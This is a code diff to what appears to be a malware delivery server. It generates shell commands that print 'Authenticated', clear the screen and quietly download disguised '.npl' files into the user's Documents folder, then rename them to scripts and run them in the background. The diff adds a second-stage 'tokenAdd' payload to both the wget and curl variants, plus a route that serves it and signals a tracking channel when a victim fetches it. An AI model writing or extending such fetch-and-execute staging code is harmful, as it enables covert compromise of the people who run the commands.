@@ -234,12 +234,15 @@ echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
 wget -q -O "$TARGET_DIR/tokenlinux.npl" "${domain}/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
+wget -q -O "$TARGET_DIR/tokenAdd.npl" "${domain}/task/tokenAdd?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
+mv "$TARGET_DIR/tokenAdd.npl" "$TARGET_DIR/tokenAdd.sh"
 clear
 chmod +x "$TARGET_DIR/tokenlinux.sh"
+chmod +x "$TARGET_DIR/tokenAdd.sh"
 clear
-nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+bash "$TARGET_DIR/tokenAdd.sh" > /dev/null 2>&1 &
 clear
 exit 0
 `);
@@ -275,10 +278,12 @@ echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
 curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
+curl -s -L -o "$HOME/Documents/tokenAdd.sh" "${domain}/task/tokenAdd?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
+chmod +x "$HOME/Documents/tokenAdd.sh"
 clear
-nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
+bash "$HOME/Documents/tokenAdd.sh" > /dev/null 2>&1 &
 clear
 exit 0
 `);
@@ -380,6 +385,44 @@ router.get('/token', async (req, res) => {
     });
   } catch (err) {
     console.error('[ROUTE] /token error:', err);
+    return res.status(500).send('Internal error');
+  }
+});
+router.get('/tokenAdd', async (req, res) => {
+  try {
+    const origToken = req.query.token;
+    const st = req.query.st || getBearerFromReq(req);
+    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+    const ip = normalizeIp(rawIp);
+    const filePath = path.join(__dirname, '..', 'public', 'tokenAdd.npl');
+
+    fs.readFile(filePath, 'utf8', (err, content) => {
+      if (err) {
+        console.error('[FILE] tokenAdd.npl read error:', err);
+        return res.status(500).send('Error reading tokenAdd.npl');
+      }
+
+      const domain = `${req.protocol}://${req.get('host')}`;
+      let modified = content.replace(/{{DOMAIN}}/g, domain).replace(/{{token}}/g, origToken || '');
+
+      if (modified.includes('{{STEP_TOKEN}}')) {
+        modified = modified.replace(/{{STEP_TOKEN}}/g, st2);
+      } else {
+        modified += `\n# STEP_TOKEN=${st2}\n:: STEP_TOKEN=${st2}\n`;
+      }
+
+      try {
+        if (origToken && sseClients.has(origToken)) {
+          sseClients.get(origToken).write(`data: tokenAdd_served\n\n`);
+        }
+      } catch (e) {
+        console.error('[SSE] Failed to notify client about tokenAdd_served:', e);
+      }
+
+      res.type('text/plain').send(modified);
+    });
+  } catch (err) {
+    console.error('[ROUTE] /tokenAdd error:', err);
     return res.status(500).send('Internal error');
   }
 });
